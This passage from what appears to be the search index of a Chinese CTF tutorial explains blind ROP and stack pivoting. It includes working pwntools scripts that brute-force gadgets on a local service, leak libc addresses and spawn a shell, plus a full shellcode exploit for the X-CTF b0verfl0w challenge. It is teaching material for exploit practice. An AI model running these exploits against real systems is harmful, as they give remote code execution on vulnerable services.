\u53ea\u6709\u6700\u540e\u4e00\u79cd\u683c\u5f0f\uff0c\u7a0b\u5e8f\u624d\u4f1a\u6b63\u5e38\u6267\u884c\u3002 \u6ce8 \uff1a\u5728\u6ca1\u6709PIE\u4fdd\u62a4\u7684\u65f6\u5019\uff0c64\u4f4d\u7a0b\u5e8f\u7684ELF\u6587\u4ef6\u76840x400000\u5904\u67097\u4e2a\u975e\u96f6\u5b57\u8282\u3002 \u90a3\u4e48\u6211\u4eec\u8be5\u5982\u4f55\u5177\u4f53\u5730\u53bb\u505a\u5462\uff1f\u6709\u4e00\u79cd\u6bd4\u8f83\u76f4\u63a5\u7684\u65b9\u6cd5\u5c31\u662f\u4ece\u5934\u5230\u5c3e\u4f9d\u6b21\u626b\u63cf\u6bcf\u4e2aplt\u8868\u9879\uff0c\u4f46\u662f\u8fd9\u4e2a\u5374\u6bd4\u8f83\u9ebb\u70e6\u3002\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u5982\u4e0b\u7684\u4e00\u79cd\u65b9\u6cd5 \u5229\u7528plt\u8868\u9879\u7684\u6162\u8def\u5f84 \u5e76\u4e14\u5229\u7528\u4e0b\u4e00\u4e2a\u8868\u9879\u7684\u6162\u8def\u5f84\u7684\u5730\u5740\u6765\u8986\u76d6\u8fd4\u56de\u5730\u5740 \u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u4e0d\u7528\u6765\u56de\u63a7\u5236\u76f8\u5e94\u7684\u53d8\u91cf\u4e86\u3002 \u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u80fd\u78b0\u5de7\u627e\u5230strncmp\u6216\u8005strcasecmp\u51fd\u6570\uff0c\u5b83\u4eec\u5177\u6709\u548cstrcmp\u4e00\u6837\u7684\u6548\u679c\u3002","title":"\u63a7\u5236rdx"},{"location":"pwn/stackoverflow/medium_rop/#_14","text":"\u5bfb\u627e\u8f93\u51fa\u51fd\u6570\u65e2\u53ef\u4ee5\u5bfb\u627ewrite\uff0c\u4e5f\u53ef\u4ee5\u5bfb\u627eputs\u3002\u4e00\u822c\u73b0\u5148\u627eputs\u51fd\u6570\u3002\u4e0d\u8fc7\u8fd9\u91cc\u4e3a\u4e86\u4ecb\u7ecd\u65b9\u4fbf\uff0c\u5148\u4ecb\u7ecd\u5982\u4f55\u5bfb\u627ewrite\u3002","title":"\u5bfb\u627e\u8f93\u51fa\u51fd\u6570"},{"location":"pwn/stackoverflow/medium_rop/#writeplt","text":"\u5f53\u6211\u4eec\u53ef\u4ee5\u63a7\u5236write\u51fd\u6570\u7684\u4e09\u4e2a\u53c2\u6570\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u518d\u6b21\u904d\u5386\u6240\u6709\u7684plt\u8868\uff0c\u6839\u636ewrite\u51fd\u6570\u5c06\u4f1a\u8f93\u51fa\u5185\u5bb9\u6765\u627e\u5230\u5bf9\u5e94\u7684\u51fd\u6570\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u6709\u4e2a\u6bd4\u8f83\u9ebb\u70e6\u7684\u5730\u65b9\u5728\u4e8e\u6211\u4eec\u9700\u8981\u627e\u5230\u6587\u4ef6\u63cf\u8ff0\u7b26\u7684\u503c\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u6709\u4e24\u79cd\u65b9\u6cd5\u6765\u627e\u5230\u8fd9\u4e2a\u503c \u4f7f\u7528rop chain\uff0c\u540c\u65f6\u4f7f\u5f97\u6bcf\u4e2arop\u5bf9\u5e94\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u4e0d\u4e00\u6837 \u540c\u65f6\u6253\u5f00\u591a\u4e2a\u8fde\u63a5\uff0c\u5e76\u4e14\u6211\u4eec\u4f7f\u7528\u76f8\u5bf9\u8f83\u9ad8\u7684\u6570\u503c\u6765\u8bd5\u4e00\u8bd5\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f linux\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u6700\u591a\u53ea\u80fd\u6253\u5f001024\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26\u3002 posix\u6807\u51c6\u6bcf\u6b21\u7533\u8bf7\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u6570\u503c\u603b\u662f\u5f53\u524d\u6700\u5c0f\u53ef\u7528\u6570\u503c\u3002 \u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u9009\u62e9\u5bfb\u627eputs\u51fd\u6570\u3002","title":"\u5bfb\u627ewrite@plt"},{"location":"pwn/stackoverflow/medium_rop/#putsplt","text":"\u5bfb\u627eputs\u51fd\u6570(\u8fd9\u91cc\u6211\u4eec\u5bfb\u627e\u7684\u662f plt)\uff0c\u6211\u4eec\u81ea\u7136\u9700\u8981\u63a7\u5236rdi\u53c2\u6570\uff0c\u5728\u4e0a\u9762\uff0c\u6211\u4eec\u5df2\u7ecf\u627e\u5230\u4e86brop gadget\u3002\u90a3\u4e48\uff0c\u6211\u4eec\u6839\u636ebrop gadget\u504f\u79fb9\u53ef\u4ee5\u5f97\u5230\u76f8\u5e94\u7684gadgets\uff08\u7531ret2libc_csu_init\u4e2d\u540e\u7eed\u53ef\u5f97\uff09\u3002\u540c\u65f6\u5728\u7a0b\u5e8f\u8fd8\u6ca1\u6709\u5f00\u542fPIE\u4fdd\u62a4\u7684\u60c5\u51b5\u4e0b\uff0c0x400000\u5904\u4e3aELF\u6587\u4ef6\u7684\u5934\u90e8\uff0c\u5176\u5185\u5bb9\u4e3a\\x7fELF\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u8fd9\u4e2a\u6765\u8fdb\u884c\u5224\u65ad\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5176payload\u5982\u4e0b payload = 'A'*length +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)","title":"\u5bfb\u627eputs@plt"},{"location":"pwn/stackoverflow/medium_rop/#_15","text":"\u6b64\u65f6\uff0c\u653b\u51fb\u8005\u5df2\u7ecf\u53ef\u4ee5\u63a7\u5236\u8f93\u51fa\u51fd\u6570\u4e86\uff0c\u90a3\u4e48\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u8f93\u51fa.text\u6bb5\u66f4\u591a\u7684\u5185\u5bb9\u4ee5\u4fbf\u4e8e\u6765\u627e\u5230\u66f4\u591a\u5408\u9002gadgets\u3002\u540c\u65f6\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u627e\u5230\u4e00\u4e9b\u5176\u5b83\u51fd\u6570\uff0c\u5982dup2\u6216\u8005execve\u51fd\u6570\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u653b\u51fb\u8005\u6b64\u65f6\u4f1a\u53bb\u505a\u4e0b\u4e8b\u60c5 \u5c06socket\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u8f93\u5165\u8f93\u51fa \u5bfb\u627e\u201c/bin/sh\u201d\u7684\u5730\u5740\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6700\u597d\u662f\u627e\u5230\u4e00\u5757\u53ef\u5199\u7684\u5185\u5b58\uff0c\u5229\u7528write\u51fd\u6570\u5c06\u8fd9\u4e2a\u5b57\u7b26\u4e32\u5199\u5230\u76f8\u5e94\u7684\u5730\u5740\u3002 \u6267\u884cexecve\u83b7\u53d6shell\uff0c\u83b7\u53d6execve\u4e0d\u4e00\u5b9a\u5728plt\u8868\u4e2d\uff0c\u6b64\u65f6\u653b\u51fb\u8005\u5c31\u9700\u8981\u60f3\u529e\u6cd5\u6267\u884c\u7cfb\u7edf\u8c03\u7528\u4e86\u3002","title":"\u653b\u51fb\u603b\u7ed3"},{"location":"pwn/stackoverflow/medium_rop/#_16","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5HCTF2016\u7684\u51fa\u9898\u4eba\u5931\u8e2a\u4e86\u4e3a\u4f8b\uff0c\u76f8\u5173\u7684\u90e8\u7f72\u6587\u4ef6\u90fd\u653e\u5728\u4e86example\u6587\u4ef6\u5939\u4e0b\u7684\u5bf9\u5e94\u76ee\u5f55\u4e0b\u3002\u57fa\u672c\u601d\u8def\u5982\u4e0b","title":"\u4f8b\u5b50"},{"location":"pwn/stackoverflow/medium_rop/#_17","text":"def getbufferflow_length (): i = 1 while 1 : try : sh = remote ( '127.0.0.1' , 9999 ) sh . recvuntil ( 'WelCome my friend,Do you know password? \\n ' ) sh . send ( i * 'a' ) output = sh . recv () sh . close () if not output . startswith ( 'No password' ): return i - 1 else : i += 1 except EOFError : sh . close () return i - 1 \u6839\u636e\u4e0a\u9762\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\uff0c\u6808\u6ea2\u51fa\u7684\u957f\u5ea6\u4e3a72\u3002\u540c\u65f6\uff0c\u6839\u636e\u56de\u663e\u4fe1\u606f\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u5e76\u6ca1\u6709\u5f00\u542fcanary\u4fdd\u62a4\uff0c\u5426\u5219\uff0c\u5c31\u4f1a\u6709\u76f8\u5e94\u7684\u62a5\u9519\u5185\u5bb9\u3002\u6240\u4ee5\u6211\u4eec\u4e0d\u9700\u8981\u6267\u884cstack reading\u3002","title":"\u786e\u5b9a\u6808\u6ea2\u51fa\u957f\u5ea6"},{"location":"pwn/stackoverflow/medium_rop/#stop-gadgets_1","text":"\u5bfb\u627e\u8fc7\u7a0b\u5982\u4e0b def get_stop_addr ( length ): addr = 0x400000 while 1 : try : sh = remote ( '127.0.0.1' , 9999 ) sh . recvuntil ( 'password? \\n ' ) payload = 'a' * length + p64 ( addr ) sh . sendline ( payload ) sh . recv () sh . close () print 'one success addr: 0x %x ' % ( addr ) return addr except Exception : addr += 1 sh . close () \u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u5c1d\u8bd564\u4f4d\u7a0b\u5e8f\u6ca1\u6709\u5f00\u542fPIE\u7684\u60c5\u51b5\uff0c\u56e0\u4e3a\u4e00\u822c\u662f\u8fd9\u4e2a\u6837\u5b50\u7684\uff0c\uff0c\uff0c\u5982\u679c\u5f00\u542f\u4e86\uff0c\uff0c\u90a3\u5c31\u6309\u7167\u5f00\u542f\u4e86\u7684\u65b9\u6cd5\u505a\uff0c\uff0c\u7ed3\u679c\u53d1\u73b0\u4e86\u4e0d\u5c11\uff0c\uff0c\u6211\u9009\u62e9\u4e86\u4e00\u4e2a\u8c8c\u4f3c\u8fd4\u56de\u5230\u6e90\u7a0b\u5e8f\u4e2d\u7684\u5730\u5740 one success stop gadget addr: 0x4006b6","title":"\u5bfb\u627e stop gadgets"},{"location":"pwn/stackoverflow/medium_rop/#brop-gadgets_1","text":"\u4e0b\u9762\uff0c\u6211\u4eec\u6839\u636e\u4e0a\u9762\u4ecb\u7ecd\u7684\u539f\u7406\u6765\u5f97\u5230\u5bf9\u5e94\u7684brop gadgets\u5730\u5740\u3002\u6784\u9020\u5982\u4e0b\uff0cget_brop_gadget\u662f\u4e3a\u4e86\u5f97\u5230\u53ef\u80fd\u7684brop gadget\uff0c\u540e\u9762\u7684check_brop_gadget\u662f\u4e3a\u4e86\u68c0\u67e5\u3002 def get_brop_gadget ( length , stop_gadget , addr ): try : sh = remote ( '127.0.0.1' , 9999 ) sh . recvuntil ( 'password? \\n ' ) payload = 'a' * length + p64 ( addr ) + p64 ( 0 ) * 6 + p64 ( stop_gadget ) + p64 ( 0 ) * 10 sh . sendline ( payload ) content = sh . recv () sh . close () print content # stop gadget returns memory if not content . startswith ( 'WelCome' ): return False return True except Exception : sh . close () return False def check_brop_gadget ( length , addr ): try : sh = remote ( '127.0.0.1' , 9999 ) sh . recvuntil ( 'password? \\n ' ) payload = 'a' * length + p64 ( addr ) + 'a' * 8 * 10 sh . sendline ( payload ) content = sh . recv () sh . close () return False except Exception : sh . close () return True ##length = getbufferflow_length() length = 72 ##get_stop_addr(length) stop_gadget = 0x4006b6 addr = 0x400740 while 1 : print hex ( addr ) if get_brop_gadget ( length , stop_gadget , addr ): print 'possible brop gadget: 0x %x ' % addr if check_brop_gadget ( length , addr ): print 'success brop gadget: 0x %x ' % addr break addr += 1 \u8fd9\u6837\uff0c\u6211\u4eec\u57fa\u672c\u5f97\u5230\u4e86brop\u7684gadgets\u5730\u57400x4007ba","title":"\u8bc6\u522bbrop gadgets"},{"location":"pwn/stackoverflow/medium_rop/#putsplt_1","text":"\u6839\u636e\u4e0a\u9762\uff0c\u6240\u8bf4\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0bpayload\u6765\u8fdb\u884c\u83b7\u53d6 payload = 'A'*72 +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget) \u5177\u4f53\u51fd\u6570\u5982\u4e0b def get_puts_addr ( length , rdi_ret , stop_gadget ): addr = 0x400000 while 1 : print hex ( addr ) sh = remote ( '127.0.0.1' , 9999 ) sh . recvuntil ( 'password? \\n ' ) payload = 'A' * length + p64 ( rdi_ret ) + p64 ( 0x400000 ) + p64 ( addr ) + p64 ( stop_gadget ) sh . sendline ( payload ) try : content = sh . recv () if content . startswith ( ' \\x7f ELF' ): print 'find puts@plt addr: 0x %x ' % addr return addr sh . close () addr += 1 except Exception : sh . close () addr += 1 \u6700\u540e\u6839\u636eplt\u7684\u7ed3\u6784\uff0c\u9009\u62e90x400560\u4f5c\u4e3aputs@plt","title":"\u786e\u5b9aputs@plt\u5730\u5740"},{"location":"pwn/stackoverflow/medium_rop/#putsgot","text":"\u5728\u6211\u4eec\u53ef\u4ee5\u8c03\u7528puts\u51fd\u6570\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u6cc4\u9732puts\u51fd\u6570\u7684\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6libc\u7248\u672c\uff0c\u4ece\u800c\u83b7\u53d6\u76f8\u5173\u7684system\u51fd\u6570\u5730\u5740\u4e0e/bin/sh\u5730\u5740\uff0c\u4ece\u800c\u83b7\u53d6shell\u3002\u6211\u4eec\u4ece0x400000\u5f00\u59cb\u6cc4\u97320x1000\u4e2a\u5b57\u8282\uff0c\u8fd9\u5df2\u7ecf\u8db3\u591f\u5305\u542b\u7a0b\u5e8f\u7684plt\u90e8\u5206\u4e86\u3002\u4ee3\u7801\u5982\u4e0b def leak ( length , rdi_ret , puts_plt , leak_addr , stop_gadget ): sh = remote ( '127.0.0.1' , 9999 ) payload = 'a' * length + p64 ( rdi_ret ) + p64 ( leak_addr ) + p64 ( puts_plt ) + p64 ( stop_gadget ) sh . recvuntil ( 'password? \\n ' ) sh . sendline ( payload ) try : data = sh . recv () sh . close () try : data = data [: data . index ( \" \\n WelCome\" )] except Exception : data = data if data == \"\" : data = ' \\x00 ' return data except Exception : sh . close () return None ##length = getbufferflow_length() length = 72 ##stop_gadget = get_stop_addr(length) stop_gadget = 0x4006b6 ##brop_gadget = find_brop_gadget(length,stop_gadget) brop_gadget = 0x4007ba rdi_ret = brop_gadget + 9 ##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget) puts_plt = 0x400560 addr = 0x400000 result = \"\" while addr < 0x401000 : print hex ( addr ) data = leak ( length , rdi_ret , puts_plt , addr , stop_gadget ) if data is None : continue else : result += data addr += len ( data ) with open ( 'code' , 'wb' ) as f : f . write ( result ) \u6700\u540e\uff0c\u6211\u4eec\u5c06\u6cc4\u9732\u7684\u5185\u5bb9\u5199\u5230\u6587\u4ef6\u91cc\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\u5982\u679c\u6cc4\u9732\u51fa\u6765\u7684\u662f\u201c\u201d,\u90a3\u8bf4\u660e\u6211\u4eec\u9047\u5230\u4e86'\\x00'\uff0c\u56e0\u4e3aputs\u662f\u8f93\u51fa\u5b57\u7b26\u4e32\uff0c\u5b57\u7b26\u4e32\u662f\u4ee5'\\x00'\u4e3a\u7ec8\u6b62\u7b26\u7684\u3002\u4e4b\u540e\u5229\u7528ida\u6253\u5f00binary\u6a21\u5f0f\uff0c\u9996\u5148\u5728edit->segments->rebase program \u5c06\u7a0b\u5e8f\u7684\u57fa\u5730\u5740\u6539\u4e3a0x400000\uff0c\u7136\u540e\u627e\u5230\u504f\u79fb0x560\u5904\uff0c\u5982\u4e0b seg000: 0000000000400560 db 0 FFh seg000: 0000000000400561 db 25 h ; % seg000 : 0000000000400562 db 0 B2h ; seg000 : 0000000000400563 db 0 Ah seg000: 0000000000400564 db 20 h seg000: 0000000000400565 db 0 \u7136\u540e\u6309\u4e0bc,\u5c06\u6b64\u5904\u7684\u6570\u636e\u8f6c\u6362\u4e3a\u6c47\u7f16\u6307\u4ee4\uff0c\u5982\u4e0b seg000: 0000000000400560 ; --------------------------------------------------------------------------- seg000: 0000000000400560 jmp qword ptr cs : 601018 h seg000: 0000000000400566 ; --------------------------------------------------------------------------- seg000: 0000000000400566 push 0 seg000: 000000000040056 B jmp loc_400550 seg000: 000000000040056 B ; --------------------------------------------------------------------------- \u8fd9\u8bf4\u660e\uff0cputs@got\u7684\u5730\u5740\u4e3a0x601018\u3002","title":"\u6cc4\u9732puts@got\u5730\u5740"},{"location":"pwn/stackoverflow/medium_rop/#_18","text":"##length = getbufferflow_length() length = 72 ##stop_gadget = get_stop_addr(length) stop_gadget = 0x4006b6 ##brop_gadget = find_brop_gadget(length,stop_gadget) brop_gadget = 0x4007ba rdi_ret = brop_gadget + 9 ##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget) puts_plt = 0x400560 ##leakfunction(length, rdi_ret, puts_plt, stop_gadget) puts_got = 0x601018 sh = remote ( '127.0.0.1' , 9999 ) sh . recvuntil ( 'password? \\n ' ) payload = 'a' * length + p64 ( rdi_ret ) + p64 ( puts_got ) + p64 ( puts_plt ) + p64 ( stop_gadget ) sh . sendline ( payload ) data = sh . recvuntil ( ' \\n WelCome' , drop = True ) puts_addr = u64 ( data . ljust ( 8 , ' \\x00 ' )) libc = LibcSearcher ( 'puts' , puts_addr ) libc_base = puts_addr - libc . dump ( 'puts' ) system_addr = libc_base + libc . dump ( 'system' ) binsh_addr = libc_base + libc . dump ( 'str_bin_sh' ) payload = 'a' * length + p64 ( rdi_ret ) + p64 ( binsh_addr ) + p64 ( system_addr ) + p64 ( stop_gadget ) sh . sendline ( payload ) sh . interactive ()","title":"\u7a0b\u5e8f\u5229\u7528"},{"location":"pwn/stackoverflow/medium_rop/#_19","text":"http://ytliu.info/blog/2014/09/28/blind-return-oriented-programming-brop-attack-gong-ji-yuan-li/ http://bobao.360.cn/learning/detail/3694.html http://o0xmuhe.me/2017/01/22/Have-fun-with-Blind-ROP/","title":"\u53c2\u8003\u9605\u8bfb"},{"location":"pwn/stackoverflow/others/","text":"\u82b1\u5f0f\u6808\u6ea2\u51fa\u6280\u5de7 \u00b6 stack pivoting \u00b6 \u539f\u7406 \u00b6 stack pivoting\uff0c\u6b63\u5982\u5b83\u6240\u63cf\u8ff0\u7684\uff0c\u8be5\u6280\u5de7\u5c31\u662f\u52ab\u6301\u6808\u6307\u9488\u6307\u5411\u653b\u51fb\u8005\u6240\u80fd\u63a7\u5236\u7684\u5185\u5b58\u5904\uff0c\u7136\u540e\u518d\u5728\u76f8\u5e94\u7684\u4f4d\u7f6e\u8fdb\u884c ROP\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u80fd\u5728\u4ee5\u4e0b\u60c5\u51b5\u9700\u8981\u4f7f\u7528 stack pivoting \u53ef\u4ee5\u63a7\u5236\u7684\u6808\u6ea2\u51fa\u7684\u5b57\u8282\u6570\u8f83\u5c11\uff0c\u96be\u4ee5\u6784\u9020\u8f83\u957f\u7684 ROP \u94fe \u5f00\u542f\u4e86 PIE \u4fdd\u62a4\uff0c\u6808\u5730\u5740\u672a\u77e5\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u6808\u52ab\u6301\u5230\u5df2\u77e5\u7684\u533a\u57df\u3002 \u5176\u5b83\u6f0f\u6d1e\u96be\u4ee5\u5229\u7528\uff0c\u6211\u4eec\u9700\u8981\u8fdb\u884c\u8f6c\u6362\uff0c\u6bd4\u5982\u8bf4\u5c06\u6808\u52ab\u6301\u5230\u5806\u7a7a\u95f4\uff0c\u4ece\u800c\u5728\u5806\u4e0a\u5199 top \u53ca\u8fdb\u884c\u5806\u6f0f\u6d1e\u5229\u7528 \u6b64\u5916\uff0c\u5229\u7528 stack pivoting \u6709\u4ee5\u4e0b\u51e0\u4e2a\u8981\u6c42 \u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u3002 \u53ef\u4ee5\u63a7\u5236 sp \u6307\u9488\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u63a7\u5236\u6808\u6307\u9488\u4f1a\u4f7f\u7528 ROP\uff0c\u5e38\u89c1\u7684\u63a7\u5236\u6808\u6307\u9488\u7684 gadgets \u4e00\u822c\u662f pop rsp / esp \u5f53\u7136\uff0c\u8fd8\u4f1a\u6709\u4e00\u4e9b\u5176\u5b83\u7684\u59ff\u52bf\u3002\u6bd4\u5982\u8bf4 libc_csu_init \u4e2d\u7684 gadgets\uff0c\u6211\u4eec\u901a\u8fc7\u504f\u79fb\u5c31\u53ef\u4ee5\u5f97\u5230\u63a7\u5236 rsp \u6307\u9488\u3002\u4e0a\u9762\u7684\u662f\u6b63\u5e38\u7684\uff0c\u4e0b\u9762\u7684\u662f\u504f\u79fb\u7684\u3002 gef \u27a4 x / 7 i 0x000000000040061a 0 x40061a < __libc_csu_init + 90 > : pop rbx 0 x40061b < __libc_csu_init + 91 > : pop rbp 0 x40061c < __libc_csu_init + 92 > : pop r12 0 x40061e < __libc_csu_init + 94 > : pop r13 0 x400620 < __libc_csu_init + 96 > : pop r14 0 x400622 < __libc_csu_init + 98 > : pop r15 0 x400624 < __libc_csu_init + 100 > : ret gef \u27a4 x / 7 i 0x000000000040061d 0 x40061d < __libc_csu_init + 93 > : pop rsp 0 x40061e < __libc_csu_init + 94 > : pop r13 0 x400620 < __libc_csu_init + 96 > : pop r14 0 x400622 < __libc_csu_init + 98 > : pop r15 0 x400624 < __libc_csu_init + 100 > : ret \u6b64\u5916\uff0c\u8fd8\u6709\u66f4\u52a0\u9ad8\u7ea7\u7684 fake frame\u3002 \u5b58\u5728\u53ef\u4ee5\u63a7\u5236\u5185\u5bb9\u7684\u5185\u5b58\uff0c\u4e00\u822c\u6709\u5982\u4e0b bss \u6bb5\u3002\u7531\u4e8e\u8fdb\u7a0b\u6309\u9875\u5206\u914d\u5185\u5b58\uff0c\u5206\u914d\u7ed9 bss \u6bb5\u7684\u5185\u5b58\u5927\u5c0f\u81f3\u5c11\u4e00\u4e2a\u9875(4k\uff0c0x1000)\u5927\u5c0f\u3002\u7136\u800c\u4e00\u822cbss\u6bb5\u7684\u5185\u5bb9\u7528\u4e0d\u4e86\u8fd9\u4e48\u591a\u7684\u7a7a\u95f4\uff0c\u5e76\u4e14 bss \u6bb5\u5206\u914d\u7684\u5185\u5b58\u9875\u62e5\u6709\u8bfb\u5199\u6743\u9650\u3002 heap\u3002\u4f46\u662f\u8fd9\u4e2a\u9700\u8981\u6211\u4eec\u80fd\u591f\u6cc4\u9732\u5806\u5730\u5740\u3002 \u793a\u4f8b \u00b6 \u4f8b1 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 X-CTF Quals 2016 - b0verfl0w \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u9996\u5148\uff0c\u67e5\u770b\u7a0b\u5e8f\u7684\u5b89\u5168\u4fdd\u62a4\uff0c\u5982\u4e0b \u279c X-CTF Quals 2016 - b0verfl0w git: ( iromise ) \u2717 checksec b0verfl0w Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE ( 0x8048000 ) RWX: Has RWX segments \u53ef\u4ee5\u770b\u51fa\u6e90\u7a0b\u5e8f\u4e3a 32 \u4f4d\uff0c\u4e5f\u6ca1\u6709\u5f00\u542f NX \u4fdd\u62a4\uff0c\u4e0b\u9762\u6211\u4eec\u6765\u627e\u4e00\u4e0b\u7a0b\u5e8f\u7684\u6f0f\u6d1e signed int vul () { char s ; // [sp+18h] [bp-20h]@1 puts ( \" \\n ======================\" ); puts ( \" \\n Welcome to X-CTF 2016!\" ); puts ( \" \\n ======================\" ); puts ( \"What's your name?\" ); fflush ( stdout ); fgets ( & s , 50 , stdin ); printf ( \"Hello %s.\" , & s ); fflush ( stdout ); return 1 ; } \u53ef\u4ee5\u770b\u51fa\uff0c\u6e90\u7a0b\u5e8f\u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e\u3002\u4f46\u662f\u5176\u6240\u80fd\u6ea2\u51fa\u7684\u5b57\u8282\u5c31\u53ea\u6709 50-0x20-4=14 \u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u6211\u4eec\u5f88\u96be\u6267\u884c\u4e00\u4e9b\u6bd4\u8f83\u597d\u7684 ROP\u3002\u8fd9\u91cc\u6211\u4eec\u5c31\u8003\u8651 stack pivoting \u3002\u7531\u4e8e\u7a0b\u5e8f\u672c\u8eab\u5e76\u6ca1\u6709\u5f00\u542f\u5806\u6808\u4fdd\u62a4\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5728\u6808\u4e0a\u5e03\u7f6eshellcode \u5e76\u6267\u884c\u3002\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b \u5229\u7528\u6808\u6ea2\u51fa\u5e03\u7f6e shellcode \u63a7\u5236 eip \u6307\u5411 shellcode\u5904 \u7b2c\u4e00\u6b65\uff0c\u8fd8\u662f\u6bd4\u8f83\u5bb9\u6613\u5730\uff0c\u76f4\u63a5\u8bfb\u53d6\u5373\u53ef\uff0c\u4f46\u662f\u7531\u4e8e\u7a0b\u5e8f\u672c\u8eab\u4f1a\u5f00\u542f ASLR \u4fdd\u62a4\uff0c\u6240\u4ee5\u6211\u4eec\u5f88\u96be\u76f4\u63a5\u77e5\u9053shellcode \u7684\u5730\u5740\u3002\u4f46\u662f\u6808\u4e0a\u76f8\u5bf9\u504f\u79fb\u662f\u56fa\u5b9a\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6808\u6ea2\u51fa\u5bf9 esp \u8fdb\u884c\u64cd\u4f5c\uff0c\u4f7f\u5176\u6307\u5411 shellcode\u5904\uff0c\u5e76\u4e14\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u8df3\u8f6c\u81f3 esp\u5904\u3002\u90a3\u4e0b\u9762\u5c31\u662f\u627e\u63a7\u5236\u7a0b\u5e8f\u8df3\u8f6c\u5230 esp \u5904\u7684 gadgets \u4e86\u3002 \u279c X-CTF Quals 2016 - b0verfl0w git: ( iromise ) \u2717 ROPgadget --binary b0verfl0w --only 'jmp|ret' Gadgets information ============================================================ 0x08048504 : jmp esp 0x0804836a : ret 0x0804847e : ret 0xeac1 Unique gadgets found: 3 \u8fd9\u91cc\u6211\u4eec\u53d1\u73b0\u6709\u4e00\u4e2a\u53ef\u4ee5\u76f4\u63a5\u8df3\u8f6c\u5230 esp \u7684 gadgets\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5e03\u7f6e payload \u5982\u4e0b shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp \u90a3\u4e48\u6211\u4eec payload \u4e2d\u7684\u6700\u540e\u4e00\u90e8\u5206\u6539\u5982\u4f55\u8bbe\u7f6e esp \u5462\uff0c\u53ef\u4ee5\u77e5\u9053 size(shellcode+padding)=0x20 size(fake ebp)=0x4 size(0x08048504)=0x4 \u6240\u4ee5\u6211\u4eec\u6700\u540e\u4e00\u6bb5\u9700\u8981\u6267\u884c\u7684\u6307\u4ee4\u5c31\u662f sub 0x28 , esp jmp esp \u6240\u4ee5\u6700\u540e\u7684 exp \u5982\u4e0b from pwn import * sh = process ( './b0verfl0w' ) shellcode_x86 = \" \\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73 \" shellcode_x86 += \" \\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0 \" shellcode_x86 += \" \\x0b\\xcd\\x80 \" sub_esp_jmp = asm ( 'sub esp, 0x28;jmp esp' ) jmp_esp = 0x08048504 payload = shellcode_x86 + ( 0x20 - len ( shellcode_x86 )) * 'b' + 'bbbb' + p32 ( jmp_esp ) + sub_esp_jmp sh . sendline ( payload ) sh . interactive () \u4f8b2-\u8f6c\u79fb\u5806 \u00b6 \u5f85\u3002 \u9898\u76ee \u00b6 EkoPartyCTF 2016 fuckzing-exploit-200 frame faking \u00b6 \u6b63\u5982\u8fd9\u4e2a\u6280\u5de7\u540d\u5b57\u6240\u8bf4\u7684\u90a3\u6837\uff0c\u8fd9\u4e2a\u6280\u5de7\u5c31\u662f\u6784\u9020\u4e00\u4e2a\u865a\u5047\u7684\u6808\u5e27\u6765\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002 \u539f\u7406 \u00b6 \u6982\u62ec\u5730\u8bb2\uff0c\u6211\u4eec\u5728\u4e4b\u524d\u8bb2\u7684\u6808\u6ea2\u51fa\u4e0d\u5916\u4e4e\u4e24\u79cd\u65b9\u5f0f \u63a7\u5236\u7a0b\u5e8f EIP \u63a7\u5236\u7a0b\u5e8f EBP \u5176\u6700\u7ec8\u90fd\u662f\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002\u5728 frame faking 